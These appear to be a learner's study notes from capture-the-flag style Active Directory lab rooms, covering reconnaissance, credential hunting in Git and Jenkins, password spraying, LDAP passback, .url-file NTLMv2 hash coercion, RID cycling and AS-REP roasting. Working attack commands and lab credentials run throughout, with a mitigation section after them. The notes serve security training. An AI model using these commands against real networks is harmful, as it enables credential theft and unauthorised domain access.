|LDAP|389/636|Directory queries; misconfigured devices often store recoverable LDAP credentials|
|HTTP/HTTPS|—|Internal portals, CI/CD, device management — credentials routinely leak into logs/configs/repos|
|Kerberos|88 (TCP/UDP)|Pre-authentication behaviour can validate username existence without triggering lockouts|
|DNS|53 (TCP/UDP)|Maps infrastructure — identifies DCs, mail servers, other key assets|

**Two starting positions in a real engagement:**

- **Unauthenticated (black-box)** — network access only, no credentials; must enumerate/spray/coerce a way in. **What this room simulates.**
- **Authenticated (grey-box)** — already holding low-privileged credentials (prior phase, phishing, OSINT); can skip straight to enumeration

Either way, the goal is identical: valid credentials that unlock deeper access.

> [!summary] Quick Recap — Breaching Overview
> 
> - Breaching = obtaining the first valid credential; everything else in an AD attack chain depends on it
> - Even a low-privileged account unlocks AD querying capability invisible to unauthenticated users — often the actual source of an escalation path
> - Five services form the core attack surface: SMB, LDAP, HTTP(S), Kerberos, DNS — each a distinct breaching avenue

---

#### OSINT and Target Reconnaissance

**Building a username list before any active attack.** Real-world public sources:

- **LinkedIn** — names, titles, reporting structure; automatable via tools like `linkedin2username`
- **GitHub/GitLab** — commits using corporate email addresses reveal both the org's email format and individual usernames
- **Public breach databases** — leaked email addresses directly reveal the username format
- **Corporate "About Us"/"Meet the Team" pages** — direct name listings
- **Job postings** — reveal internal tech stack, team structure, sometimes naming conventions themselves

**Common AD username formats:**

|Format|Example (Jane Smith)|
|---|---|
|`first.last`|`jane.smith`|
|`firstlast`|`janesmith`|
|`flast`|`jsmith`|
|`first.l`|`jane.s`|
|`first`|`jane`|
|`last.first`|`smith.jane`|

**Even one confirmed email/username from OSINT is usually enough to determine the org's actual convention** — then generate a full candidate list from every gathered employee name.

**Validating candidates with Kerbrute** — exploits Kerberos pre-authentication behaviour:

- Nonexistent username → `KDC_ERR_C_PRINCIPAL_UNKNOWN`
- Existent username → KDC requests pre-authentication, confirming validity

```bash
kerbrute userenum -d thm.loc --dc 192.168.12.100 /root/usernames.txt -o valid_users.txt
```

> [!note] Why this doesn't trigger lockouts, but isn't silent either Failed pre-authentication requests via this method are **not counted as failed login attempts** — no lockout risk from enumeration itself. It does, however, generate Windows **Event ID 4768** on the DC — detectable, just not account-impacting.

**DNS enumeration** — mapping key infrastructure before any active attack:

```bash
# Domain controllers via SRV records
nslookup -type=SRV _ldap._tcp.dc._msdcs.thm.loc 192.168.12.100

# Kerberos KDC
nslookup -type=SRV _kerberos._tcp.thm.loc 192.168.12.100

# Mail servers
nslookup -type=MX thm.loc 192.168.12.100
```

> [!summary] Quick Recap — OSINT and Recon
> 
> - Even one confirmed real username/email reveals the org's entire naming convention — the highest-leverage OSINT find
> - Kerbrute's username validation exploits pre-auth error differences — zero lockout risk, but still logged (Event ID 4768)
> - DNS SRV record queries map DCs/KDCs/mail servers before any active engagement with the target begins

---

#### Credential Discovery

**Why exposed services are a goldmine:** developers/admins routinely work with real credentials (DB strings, service passwords, API keys, deployment secrets) under delivery pressure — these end up committed to repos, printed in CI/CD logs, written into shared-drive configs, or documented on internal wikis. Maps to **MITRE ATT&CK T1552 (Unsecured Credentials)**.

> [!warning] "Removed" doesn't mean "gone" A secret deleted from a file's latest commit still exists in **Git's version history** — version control preserves it permanently unless someone actively purges it, which almost never happens in practice.

**Hunting credentials in Git repositories:**

**Where to look:**

- Commit history — "temporary" committed secrets later removed, but still in the log
- Config files — `.env`, `web.config`, `appsettings.json`, `config.php`, `database.yml`
- Hardcoded secrets in source directly
- CI/CD pipeline definitions — `Jenkinsfile`, `.gitlab-ci.yml`, `.github/workflows/*.yml`

```bash
git log -p | grep -i "password\|secret\|token\|key\|credential"
```

For automated, thorough scanning (high-entropy strings + known credential patterns):

```bash
trufflehog git file:///path/to/repo
```

**Hunting credentials in Jenkins:**

Jenkins is a frequent treasure trove — often deployed with weak/default creds (`admin:admin`) or no auth enforcement at all.

**Leak locations:**

- **Build console output** — environment variables/connection strings/deployment commands in plaintext; Jenkins's `****` masking can be bypassed by improper Groovy string interpolation or custom scripts
- **Job configs (`config.xml`)** — hardcoded credentials, especially in legacy jobs
- **Environment variables** — exposed to build steps, revealed if a job prints `env`/`set`
- **Workspace files** — source code, configs, deployment artefacts left behind

```bash
curl http://ci.thm.loc/job/JOB_NAME/lastBuild/consoleText | grep -i "password\|secret\|token\|credential"
```

**Practical targets in this lab:**

- Git repo: `http://git.thm.loc/megacorp-admin/webapp-deploy`
- Jenkins: `http://ci.thm.loc/` (`admin:admin`)

> [!note] Don't stop at the first finding Even a complete credential pair found doesn't mean the hunt is over — additional accounts, service account names, and password patterns found along the way feed directly into the password-spraying phase next. A **partial** finding (username, no password) is still worth keeping — it extends the spray target list.

**Other sources worth checking (explored more deeply in later rooms):** internal wikis/onboarding docs (default passwords), SMB-share config files (`web.config`, `bootstrap.ini`, `unattend.xml`), LDAP anonymous binds, default SNMP community strings on network devices.

> [!summary] Quick Recap — Credential Discovery
> 
> - Git version history retains "deleted" secrets — always check commit history, not just the current file state
> - Jenkins build output, job configs, and exposed environment variables are the three highest-yield leak locations
> - Partial findings (a username with no password, a naming pattern) still have value — feed directly into password spraying

---

#### Username Enumeration and Password Spraying

**Password spraying vs. brute-forcing — the distinction that prevents self-inflicted lockouts:**

- **Brute-force** — many passwords against **one** account — effective but triggers lockout policies almost immediately in AD
- **Password spray** — **one** password against **many** accounts, then move to the next password — stays under the per-account lockout threshold by design

**Why spraying works:** despite complexity requirements, users gravitate to predictable patterns — `SeasonYear!` (`Summer2025!`), company name + number (`MegaCorp01!`), unrotated onboarding default passwords. These patterns recur reliably across large user populations.

> [!warning] Lockout policy awareness is mandatory before spraying Spraying 3 passwords in quick succession against a 5-attempts/30-minute lockout policy locks out **every account on the list**. Check the policy first if any credential is already held:

```bash
nxc smb 192.168.12.100 -u 'validuser' -p 'validpassword' --pass-pol
```

```
Account Lockout Threshold: 5
Reset Account Lockout Counter: 30
```

A threshold of 5 means **up to 4 passwords per 30-minute window** is safe. With zero existing credentials, assume a conservative threshold and spray one password at a time with generous delays.

**Spraying with NetExec (`nxc`)** — CrackMapExec's successor, supports SMB/LDAP/WinRM/RDP/MSSQL authentication testing.

**Cleanup first** — extract usable usernames from raw Kerbrute output:

```bash
grep "VALID USERNAME" valid_users.txt | awk '{print $NF}' | sed 's/@thm.loc//' > clean_users.txt
```

**The spray itself:**

```bash
nxc smb 192.168.12.100 -u clean_users.txt -p 'MegaCorp01!' --continue-on-success
```

- `--continue-on-success` — by default NetExec stops at the first hit; this flag keeps testing the full list, essential for finding **every** account sharing that password, not just the first

**Reading results:**

|Result|Meaning|
|---|---|
|`[+]`|Valid authentication — the target finding|
|`[-] STATUS_LOGON_FAILURE`|Wrong password — expected for most accounts|
|`[-] STATUS_ACCOUNT_DISABLED`|Account exists but disabled — doesn't count toward lockout, but unusable|
|`[-] STATUS_ACCOUNT_LOCKED_OUT`|**Stop spraying immediately** — reassess the lockout policy|
|`(Pwn3d!)`|Successful login **plus** local admin on the target host — bigger win than a standard domain account|

```bash
# Reduce detection/lockout risk with randomised delays
nxc smb 192.168.12.100 -u clean_users.txt -p 'MegaCorp01!' --continue-on-success --jitter 2-5
```

**Other viable spray targets** (covered deeper in later rooms): OWA, RDP, VPN portals, LDAP — NetExec supports these natively, just swap the protocol keyword.

> [!summary] Quick Recap — Enumeration and Spraying
> 
> - Spray = one password, many accounts; brute-force = many passwords, one account — spraying stays under lockout thresholds by design
> - Always check the lockout policy first (`nxc ... --pass-pol`) if any credential exists — otherwise assume conservative and go one password at a time
> - `--continue-on-success` is essential for a real spray — without it, NetExec stops at the first hit and misses every other account sharing that password
> - `STATUS_ACCOUNT_LOCKED_OUT` is an immediate stop signal, not something to push through

---

#### Coercion Attacks

**A fundamentally different approach:** instead of finding or guessing credentials, **trick a device or user into sending authentication material to an attacker-controlled listener.** Maps to **MITRE ATT&CK T1187 (Forced Authentication)**.

#### LDAP Passback Attack

**Mechanism:** network printers/MFPs integrate with AD via LDAP for scan-to-email, address book lookups, device-panel auth — storing LDAP service-account credentials internally to bind to the DC. Redirecting the device's configured LDAP server IP to an attacker listener and triggering a connection test causes the device to send those stored credentials directly to the attacker.

**Attack flow:**

1. Access the device's web admin interface (often default/weak creds)
2. Navigate to LDAP configuration
3. Replace the legitimate LDAP server IP with the attacker's IP
4. Trigger the device's "Test Connection" feature
5. Device sends its stored LDAP credentials to the attacker's listener — captured

**Why this works so reliably — MFPs/IoT are chronically under-hardened:**

- **Default admin credentials** persist — `admin:admin` (HP), blank password (Ricoh), `ADMIN:canon` (Canon)
- **Over-privileged service accounts** — the LDAP account is sometimes Domain Admin-level, far beyond what directory lookups actually need
- **Plaintext LDAP (389)** instead of LDAPS (636) — credentials transmit unencrypted
- **No credential rotation** — device-integration passwords can remain valid for months or years

**Practical execution:**

```bash
# Listener (port 389 often already in use on the AttackBox, use an alternate)
nc -lvnp 3489
```

Change the device's LDAP server IP to the attacker's `tun0` IP + port `3489`, save, then trigger "Test Connection":

```
0Y`T;CN=svc.ldap,OU=Service Accounts,DC=thm,DC=loc<REDACTED_PASSWORD>
```

The output contains the service account's DN and plaintext password — exact format varies by device.

> [!note] Modern devices may negotiate SASL/TLS A plain Netcat listener won't capture anything from a device negotiating SASL authentication or TLS-wrapped LDAP — that requires a rogue LDAP server (`slapd`, Impacket's `ldapd.py`) capable of handling the negotiation itself. This lab's target uses plaintext LDAP specifically, so Netcat suffices here.

**Verify captured credentials:**

```bash
nxc smb 192.168.12.100 -u 'svc.ldap' -p 'CAPTURED_PASSWORD'
```

A `[-] STATUS_ACCOUNT_DISABLED` response (as in this lab) still **confirms the credential is valid domain-wide** — just not currently usable. Valid-but-disabled is still useful intelligence (naming patterns, password format) even when not directly exploitable.

#### File-Based Coercion

**Mechanism:** placing a specially crafted file on a **writable** network share. When a user browses that share in Windows Explorer, the OS automatically attempts to render the file's **icon** — if the icon path is a UNC path pointing at an attacker machine, Windows silently initiates SMB authentication to that path, leaking the browsing user's **NTLMv2 hash**, with zero interaction from the user beyond simply opening the share folder.

> [!note] `.url` files are the current, reliable vector `.scf` and `desktop.ini` based variants of this attack have been patched on fully updated Windows 10/11. `.url` (Internet Shortcut) files, via their `IconFile` field, remain effective on current Windows.

**Crafting the malicious file:**

```bash
cat > @Shortcut.url << 'EOF'
[InternetShortcut]
URL=http://thm.loc
WorkingDirectory=thm
IconFile=\\YOURTUN0IP\icons\icon.ico
IconIndex=1
EOF
```

> [!warning] The quoted `'EOF'` is not optional Without quoting the heredoc delimiter, bash interprets the double backslashes in `IconFile` as single backslashes — breaking the UNC path syntax entirely and silently failing the whole attack.

- `IconFile` — the actual trigger: the UNC path Windows attempts to load, causing the SMB auth attempt
- `@Shortcut.url` filename — the leading `@` sorts the file to the **top** of the directory listing, maximising the chance it renders (and triggers) immediately on share open

**Capturing the hash with Responder:**

```bash
sudo responder -I tun0
```

Listens across multiple protocols including SMB (445), captures any NTLMv2 authentication material sent its way.

**Uploading the file to a writable share:**

```bash
smbclient //SERVER1.thm.loc/shared-docs -U 'THM\alice.moore%MegaCorp01!'
put @Shortcut.url
```

**Captured output (once a user browses the share):**

```
[SMB] NTLMv2-SSP Username : THM\sarah.jones
[SMB] NTLMv2-SSP Hash     : sarah.jones::THM:1122334455667788:A1B2C3D4E5F6...
```

> [!warning] NTLMv2 hashes aren't directly usable like NTLM hashes This is **not** a Pass-the-Hash candidate — it must be cracked offline first:
> 
> ```bash
> hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force
> ```
> 
> Mode `5600` = NetNTLMv2. Only after cracking is this a usable plaintext credential.

> [!note] This is the tip of a much larger iceberg More advanced coercion techniques — **PetitPotam**, **PrinterBug/SpoolSample**, **DFSCoerce** — can force _domain controllers themselves_ to authenticate to an attacker listener, and combined with relay attacks (forwarding rather than cracking captured auth), form some of the most potent AD attack chains available. Covered in dedicated rooms later.

> [!summary] Quick Recap — Coercion Attacks
> 
> - LDAP passback: redirect a device's configured LDAP server to an attacker listener, trigger its built-in "test connection" feature — captures the device's stored service account credentials directly, often in plaintext
> - File-based coercion: a `.url` file's `IconFile` UNC path forces Windows to attempt SMB auth just from a user opening the containing folder — zero click/open needed on the file itself
> - Captured NTLMv2 hashes need offline cracking (`hashcat -m 5600`) — unlike NTLM hashes, not directly Pass-the-Hash usable
> - A valid-but-disabled captured credential is still useful intelligence, not a dead end
> - This room covers the beginner-level coercion techniques — PetitPotam/PrinterBug/DFSCoerce target DCs directly and are significantly more potent, covered later

---

#### Mitigation

**Understanding defences sharpens offense too** — knowing what controls to expect reveals when they're absent, and shapes approach accordingly.

**Secrets Management** (addresses: Git/CI/CD credential leaks)

- Dedicated secrets vault (HashiCorp Vault, Azure Key Vault, AWS Secrets Manager) instead of embedding credentials in code/config
- Pre-commit scanning hooks (TruffleHog, Gitleaks) to catch secrets before they ever reach version control
- Regular audits of existing repos for **historical** exposure — a secret removed from the latest commit still lives in Git history
- **Immediate rotation** on any detected exposure — removing the secret from code is not enough; the old credential must be invalidated
- Mask/redact secrets in CI/CD build logs, restrict build output access

**Password Policies and Account Lockout** (addresses: password spraying)

- Minimum **14+ character** passwords — length outperforms complexity rules alone
- Banned-password lists covering common org-specific patterns (company name + year, season + year) — tools like Azure AD Password Protection enforce this
- **Unique, randomly generated** initial passwords per new account, never an org-wide default
- Lockout threshold tuned carefully — too low (3 attempts) causes operational disruption, too high (50) gives attackers spraying room; **5–10 attempts with a 30-minute window** is a common balance
- Monitoring for **distributed** authentication failures across many accounts — the specific signature of a spray, worth alerting on even when no single account crosses the lockout threshold

**Device Hardening** (addresses: LDAP passback)

- Change default admin credentials on **every** network device (printers, scanners, MFPs, IoT) before deployment
- **LDAPS (636), not plaintext LDAP (389)** — encrypted sessions mean a passback attack captures ciphertext, not plaintext credentials
- Restrict device admin interface access by IP/VLAN — not reachable from general user networks
- Dedicated, **low-privilege**, read-only-scoped service accounts for device LDAP integration — never Domain Admin-level
- Include network devices in regular vulnerability scanning/asset management, not just servers/workstations

**File Share Security** (addresses: file-based coercion)

- Least-privilege share permissions — write access only where genuinely needed
- Monitor for suspicious file types (`.url`, `.lnk`, `.scf`, `desktop.ini`) rarely appearing on legitimate data shares — flaggable via file integrity monitoring/EDR
- Audit share access for the specific pattern of a new file appearing followed by a burst of SMB auth attempts to an external IP

**NTLM Hardening** (addresses: hash capture generally)

- Disable NTLMv1 entirely, enforce NTLMv2 minimum via GPO (`Network Security: LAN Manager authentication level` → "Send NTLMv2 response only. Refuse LM & NTLM")
- Enforce **SMB signing** domain-wide to prevent relay attacks on intercepted NTLM auth
- Block outbound SMB (445) at the network perimeter — internal workstations rarely have a legitimate reason to initiate SMB to external IPs
- Plan active migration toward NTLM deprecation, in line with Microsoft's own roadmap

**Network Segmentation and Access Control** (general, cross-cutting)

- Management interfaces (printer admin, Jenkins, Git servers) restricted to dedicated management VLANs
- Internal services scoped to only the teams that need them — a dev-team Jenkins instance shouldn't be reachable from the general corporate network
- **MFA** on internet-facing and critical internal services (VPN, email, remote access) — directly neutralises the impact of any single breached password, since the credential alone stops being sufficient

> [!summary] Quick Recap — Mitigation
> 
> - Every mitigation category maps 1:1 to a specific technique demonstrated earlier in the room — this isn't generic hardening advice, it's a direct answer sheet
> - Secrets rotation after exposure is non-negotiable — deleting the secret from code without rotating it leaves the old credential valid indefinitely
> - LDAPS over plaintext LDAP directly defeats the passback attack's core mechanism — the credential capture depends entirely on the connection being unencrypted
> - MFA is the single broadest mitigation here — it neutralises nearly every credential-based technique in this room simultaneously, since a password alone stops being sufficient

---

> [!summary] Full Intro to AD Breaching Room — One Glance
> 
> - Breaching = obtaining the first valid credential; the entire attack surface (SMB/LDAP/HTTP/Kerberos/DNS) offers distinct paths to it
> - OSINT reveals naming conventions from even one confirmed account; Kerbrute validates candidate usernames with zero lockout risk (but logged via Event 4768)
> - Credential discovery in Git/Jenkins exploits the gap between "removed from the current file" and "actually gone" — version history and build logs both retain what the current state hides
> - Password spraying (one password, many accounts) stays under lockout thresholds where brute-forcing (many passwords, one account) doesn't — always check the lockout policy first
> - Coercion (LDAP passback, file-based `.url` NTLMv2 capture) forces authentication material to an attacker listener instead of discovering or guessing it — a fundamentally different technique class, with far more potent DC-targeting variants existing beyond this room's beginner scope
> - Every mitigation in this room answers a specific technique demonstrated earlier — secrets rotation, 14+ char passwords with spray-pattern monitoring, LDAPS over plaintext, least-privilege shares, NTLMv2 enforcement + SMB signing, and MFA as the broadest single defensive layer
### AD: Basic Enumeration

> [!info] Room context Starting position: VPN access to an AD network, **zero credentials**. The full unauthenticated enumeration arc — mapping the network, SMB share enumeration, domain/user enumeration via multiple unauthenticated techniques, and finally password spraying to obtain the first valid credential pair. Target subnet: `10.211.11.0/24`.

#### Mapping Out the Network

**Host discovery** — identifying live hosts across the scoped subnet before anything else.

**`fping`** — like `ping` but accepts a whole subnet/target list, moving to the next target after each probe rather than waiting per-host:

```bash
fping -agq 10.211.11.0/24
```

- `-a` — show alive hosts
- `-g` — generate target list from a supplied netmask
- `-q` — quiet mode, suppress per-probe output/ICMP errors

Results need filtering — the gateway and VPN server IPs are out of scope noise, not targets. Save remaining live hosts to a target file (`hosts.txt`) for the next phase.

**Nmap ping scan** (alternative/supplementary):

```bash
nmap -sn 10.211.11.0/24
```

`-sn` — ping scan only, no port scanning, just liveness.

**Port scanning — identifying the DC specifically.** Key AD-related ports:

|Port|Protocol|Significance|
|---|---|---|
|88|Kerberos|Kerberos-based enumeration/attacks|
|135|MS-RPC|RPC enumeration (null sessions)|
|139|SMB/NetBIOS|Legacy SMB access|
|389|LDAP|AD object/user/policy queries|
|445|SMB|Modern SMB — critical enumeration surface|
|464|Kerberos (kpasswd)|Password-related Kerberos service|

```bash
nmap -p 88,135,139,389,445 -sV -sC -iL hosts.txt
```

- `-sV` — version detection
- `-sC` — default NSE script category
- `-iL` — read targets from file

**The DC tell:** 88 (Kerberos) + 389 (LDAP) + 445 (SMB) open together, often with "Windows Server" banners or a revealed domain name, is the strong DC signature.

**For exhaustive coverage** (unfamiliar environment, don't want to miss non-standard ports):

```bash
nmap -sS -p- -T3 -iL hosts.txt -oN full_port_scan.txt
```

- `-sS` — stealthier SYN scan vs. full connect
- `-p-` — all 65,535 TCP ports
- `-T3` — normal timing (speed/stealth balance)

> [!summary] Quick Recap — Mapping the Network
> 
> - `fping -agq <subnet>` for fast host discovery; filter out gateway/VPN-server noise before building a target list
> - 88+389+445 open together is the reliable DC signature in a targeted port scan
> - Full `-p-` scans are worth running in unfamiliar environments specifically to catch services on non-standard ports a targeted scan would miss

---

#### Network Enumeration with SMB

**AD-relevant ports, expanded view (with offensive relevance noted):**

|Port|Service|Offensive Relevance|
|---|---|---|
|88|Kerberos|Ticket attacks — Pass-the-Ticket, Kerberoasting|
|135|RPC Endpoint Mapper|Service identification for lateral movement/DCOM RCE|
|139|NetBIOS Session Service|Null session abuse, info gathering|
|389|LDAP|Plaintext — prime AD object/user/policy enumeration target|
|445|SMB|File sharing/remote admin — EternalBlue, SMB relay, credential theft|
|636|LDAPS|Encrypted, but still exposes AD structure if misconfigured; AD CS cert-based attack surface|

```bash
nmap -p 88,135,139,389,445,636 -sV -sC TARGET_IP
```

**Listing SMB shares anonymously** — no credentials means testing a **null session** (empty username/password) first.

**`smbclient`** (Samba suite, FTP-client-like interaction):

```bash
smbclient -L //TARGET_IP -N
```

`-L` — list shares; `-N` — no password (anonymous/null session).

**`smbmap`** — shows per-share **read/write permissions** directly, faster than manually connecting to each:

```bash
./smbmap.py -H TARGET_IP
```

> [!note] Non-standard shares are the real target Default shares (`ADMIN$`, `C$`, `IPC$`, `NETLOGON`, `SYSVOL`) are expected on any DC. **Custom-named shares** (`AnonShare`, `SharedFiles`, `UserBackups` in this room's example) are what actually warrant investigation — and `smbmap`'s permission column instantly flags which ones allow READ/WRITE to an anonymous session.

**Nmap alternative for share permission discovery:**

```bash
nmap -p445 --script smb-enum-shares 10.211.11.10
```

**Accessing and pulling files from an open share:**

```bash
smbclient //TARGET_IP/SHARE_NAME -N
ls
get file_name
```

With credentials (once obtained later): `--user=USERNAME --password=PASSWORD` or `-U 'username%password'`, plus `-W` to specify a domain for domain accounts.

**Why anonymous SMB shares are a real finding, not just theoretical:** sysadmins sometimes leave them open deliberately for legacy device compatibility (an old printer/scanner needing read/write access). From an offensive standpoint, they frequently contain configuration files, backup files, scripts, and documents — some holding usernames or unrotated passwords. **A writable share also invites users to keep uploading more files over time**, compounding the exposure.

**Other relevant tools:**

- **`impacket-smbclient`** — Python reimplementation, Impacket toolkit (`/opt/impacket/examples/` on AttackBox)
- **CrackMapExec** — SMB enumeration modules beyond just post-exploitation: share listing, credential testing
- **`enum4linux`/`enum4linux-ng`** — broad automated SMB enumeration (`enum4linux -a TARGET_IP`); worth redirecting output to a file given the volume
- **`nmap --script smb-enum-shares`** — covered above, the Nmap-native option

> [!summary] Quick Recap — SMB Enumeration
> 
> - Null session (`-N`/empty creds) is the first thing to try against SMB with zero credentials — often works due to legacy compatibility needs
> - `smbmap` surfaces READ/WRITE permissions directly, faster than manual per-share connection testing with `smbclient`
> - Default share names are expected noise; **custom-named shares are the actual signal** worth investigating for leaked files
> - `enum4linux-ng` is the broad-spectrum automated option when manual per-tool enumeration would take too long

---

#### Domain Enumeration (Users)

Multiple unauthenticated techniques for building a valid username list, each exploiting a different common misconfiguration.

#### LDAP Enumeration (Anonymous Bind)

Some LDAP servers permit **anonymous read-only queries** — a direct source of user accounts and directory structure.

**Testing for anonymous bind:**

```bash
ldapsearch -x -H ldap://10.211.11.10 -s base
```

- `-x` — simple (anonymous) authentication
- `-H` — target LDAP server
- `-s base` — limit to the base object only, no subtree search

A large data dump confirms anonymous bind is enabled — domain naming context, DC hostname, functionality levels, etc.

**Querying actual user objects:**

```bash
ldapsearch -x -H ldap://10.211.11.10 -b "dc=tryhackme,dc=loc" "(objectClass=person)"
```

#### `enum4linux-ng`

Automates multiple enumeration techniques (SMB + RPC) in one pass — user lists, group memberships, shares, and more:

```bash
enum4linux-ng -A 10.211.11.10 -oA results.txt
```

- `-A` — all available enumeration functions (users, groups, shares, password policy, RID cycling, OS info, NetBIOS info)
- `-oA` — output to YAML and JSON

#### RPC Enumeration (Null Sessions)

MSRPC services, accessible over SMB — when null sessions are permitted, an unauthenticated user can connect to `IPC$` and enumerate users/groups/shares/etc. directly.

**Verifying null session access:**

```bash
rpcclient -U "" 10.211.11.10 -N
```

- `-U ""` — empty username, anonymous login
- `-N` — don't prompt for a password

**Enumerating domain users:**

```
rpcclient $> enumdomusers
```

Returns usernames + RIDs for the full domain user list, if the session has sufficient access.

#### RID Cycling

**Why this matters when `enumdomusers` is restricted:** RIDs (Relative Identifiers) are the per-object component of a SID, and certain RIDs are **standardised and predictable**:

|RID|Object|
|---|---|
|500|Administrator account|
|501|Guest account|
|512–514|Domain Admins / Domain Users / Domain Guests groups|
|1000+|Regular user accounts, typically|

**Manual RID brute-forcing** when direct enumeration is blocked:

```bash
for i in $(seq 500 2000); do echo "queryuser $i" | rpcclient -U "" -N 10.211.11.10 2>/dev/null | grep -i "User Name"; done
```

- `seq 500 2000` — iterate a plausible RID range
- `echo "queryuser $i"` — query each RID individually
- `2>/dev/null` — suppress errors from nonexistent RIDs
- `grep -i "User Name"` — filter to just the useful output line

> [!note] A known starting range beats guessing blind `enum4linux-ng` can help establish the actual RID range in use; absent that, starting at 1000–1200 and expanding based on results is a reasonable default. This loop takes a few minutes to complete — worth starting early and letting it run.

#### Username Enumeration with Kerbrute

**Why validate usernames found by other tools at all:** `enum4linux-ng`/`rpcclient` output can include disabled accounts, non-domain accounts, honeypot users, or false positives. Kerbrute confirms which candidates are **real, active AD users** via Kerberos pre-authentication behaviour — directly feeding an accurate password-spraying target list.

**Installation** (not pre-installed on AttackBox, needs internet access):

1. Download a precompiled binary from the GitHub releases
2. Rename to `kerbrute`
3. `chmod +x kerbrute`

**Usage:**

```bash
./kerbrute userenum --dc 10.211.11.10 -d tryhackme.loc users.txt
```

Output confirms each username with `[+] VALID USERNAME` — only the confirmed subset should carry forward into the spraying phase.

> [!note] No existing username list? Kerbrute still works A generic names wordlist (e.g. SecLists' `names.txt`) run through `kerbrute userenum` can discover accounts from scratch, without any prior enumeration tool's output as a starting point.

> [!summary] Quick Recap — Domain/User Enumeration
> 
> - LDAP anonymous bind, `enum4linux-ng`, and RPC null sessions are three independent unauthenticated enumeration paths — try all of them, since any single misconfiguration being absent doesn't rule out the others
> - RID cycling is the fallback when direct `enumdomusers` is blocked — standardised RIDs (500/501/512-514) plus a brute-force range recover the same data indirectly
> - Kerbrute's real value is **validation**, not just discovery — confirming which candidate usernames are genuinely active accounts before investing effort in password spraying against them

---

#### Password Spraying

**The technique:** a small set of common passwords tested across **many** accounts (as opposed to brute-force: many passwords against one account) — avoids lockouts by keeping per-account attempts low, exploiting the reality that organisations commonly:

- Enforce frequent password changes → users pick predictable patterns (`Summer2025!`)
- Don't enforce their own policies rigorously in practice
- Reuse common passwords across many accounts

**Common password list sources:** seasonal patterns, IT-default passwords (`Password123`), breach-leaked lists (`rockyou.txt`).

**Checking the password policy before spraying — essential first step.**

**Via `rpcclient` (null session):**

```
rpcclient $> getdompwinfo
```

```
min_password_length: 12
password_properties: 0x00000001
	DOMAIN_PASSWORD_COMPLEX
```

**Via CrackMapExec (anonymous, if permitted):**

```bash
crackmapexec smb 10.211.11.10 --pass-pol
```

Returns far more detail: minimum length, password history length, max/min password age, full complexity flags, lockout threshold, lockout duration, reset counter window.

**Interpreting complexity flag `0x00000001` / `000001`:** at least **3 of 4** character classes required (uppercase, lowercase, digits, special characters), and the password cannot contain the account name or more than two consecutive characters of the user's full name. (Full Microsoft definition linked in the room for precise edge cases.)

**Building a compliant spray list** — e.g. OSINT reveals a prior breach involving "Password"-based variants:

```
Password!
Password1
Password1!
P@ssword
Pa55word1
```

Each entry is checked against the discovered complexity requirements before use — a non-compliant guess wastes an attempt for zero chance of success.

**Running the spray with CrackMapExec:**

```bash
crackmapexec smb 10.211.11.20 -u users.txt -p passwords.txt
```

```
SMB   10.211.11.20   445   WRK   [-] tryhackme.loc\Administrator:Password! STATUS_LOGON_FAILURE
...
SMB   10.211.11.20   445   WRK   [+] tryhackme.loc\*****:******
```

**`[+]`** marks a successful authentication — the first valid credential pair, obtained with zero prior knowledge beyond careful enumeration and policy-aware spraying.

> [!warning] Password policy determines spray safety, not just spray content The lockout threshold and reset window (both surfaced by `--pass-pol`) dictate how many passwords can safely be tried per account within a given time window — this isn't just about building password-compliant guesses, it's about not locking out the entire user list in the process. A policy check before spraying is a safety step, not an optional nicety.

> [!summary] Quick Recap — Password Spraying
> 
> - Spray = few passwords, many accounts; stays under lockout thresholds by design, unlike brute-force
> - Check the password policy **first** (`rpcclient getdompwinfo` or `crackmapexec --pass-pol`) — both for building compliant guesses and for knowing how many attempts are actually safe
> - Complexity flag `0x00000001`/`000001` = 3-of-4 character-class requirement — build spray candidates that actually satisfy it, don't waste attempts on non-compliant guesses
> - A single `[+]` in CrackMapExec's output is the entire goal of this room's arc — the first valid AD credential, obtained through pure unauthenticated enumeration and policy-aware spraying

---

> [!summary] Full AD Basic Enumeration Room — One Glance
> 
> - Starting from zero credentials: host discovery (`fping`/Nmap ping scan) → targeted port scan to identify the DC (88+389+445 signature) → full port scan for thoroughness in unfamiliar environments
> - SMB enumeration: null sessions (`smbclient -N`, `smbmap`) reveal non-standard shares with real READ/WRITE access — often containing leaked credentials/configs directly
> - User enumeration via three independent unauthenticated paths: LDAP anonymous bind, `enum4linux-ng`, RPC null sessions (+ RID cycling as the fallback when direct enumeration is blocked) — Kerbrute then validates which candidates are genuinely active accounts
> - Password spraying closes the loop: check the policy first (`--pass-pol`), build complexity-compliant candidates, spray one-password-many-accounts to stay under lockout thresholds — a single `[+]` is the first valid AD credential pair
> - This room is the hands-on, tool-specific execution of the methodology introduced conceptually in Intro to AD Breaching — same phases (recon → credential discovery → username enum → spraying), now with the exact commands and output interpretation
### AD: Authenticated Enumeration

> [!info] Room context Picks up where AD: Basic Enumeration (unauthenticated) left off — now with a valid, authenticated account. Covers AS-REP Roasting, manual LOTL enumeration (CMD/PowerShell native tools), BloodHound (the graph-based enumeration paradigm), and both the official `ActiveDirectory` PowerShell module and PowerSploit's PowerView.

#### AS-REP Roasting

**What it is:** like Kerberoasting, but targets accounts with **`UF_DONT_REQUIRE_PREAUTH`** set — the "Do not require Kerberos preauthentication" flag. **No service-account requirement**, unlike Kerberoasting — any regular user account can carry this flag.

**Why it leaks a crackable hash:** normal Kerberos pre-auth has the user's hash encrypt a timestamp, which the KDC decrypts to verify identity before issuing anything. With pre-auth disabled, the KDC **skips verification entirely** and returns an encrypted AS-REP blob to _anyone who requests it_ — no prior proof of identity needed. That blob is then crackable offline.

**Two phases: enumeration, then exploitation.**

**Phase 1 — identifying vulnerable accounts:**

- **Rubeus** (`Rubeus.exe asreproast`) — Windows-only, scans AD automatically
- **Impacket's `GetNPUsers.py`** — cross-platform, needs a username list since it can't auto-enumerate from Linux the way Rubeus does on Windows

```bash
GetNPUsers.py tryhackme.loc/ -dc-ip 10.211.12.10 -usersfile users.txt -format hashcat -outputfile hashes.txt -no-pass
```

Output distinguishes accounts that **don't** have the flag set (`doesn't have UF_DONT_REQUIRE_PREAUTH set`) from the ones that do — only the latter yield a crackable hash in `hashes.txt`.

**Phase 2 — cracking with Hashcat:**

```bash
hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt
```

`-m 18200` — the specific AS-REP Kerberos hash mode.

**Once cracked:** the recovered plaintext password authenticates directly as the compromised user — request Kerberos tickets, access further resources, from here.

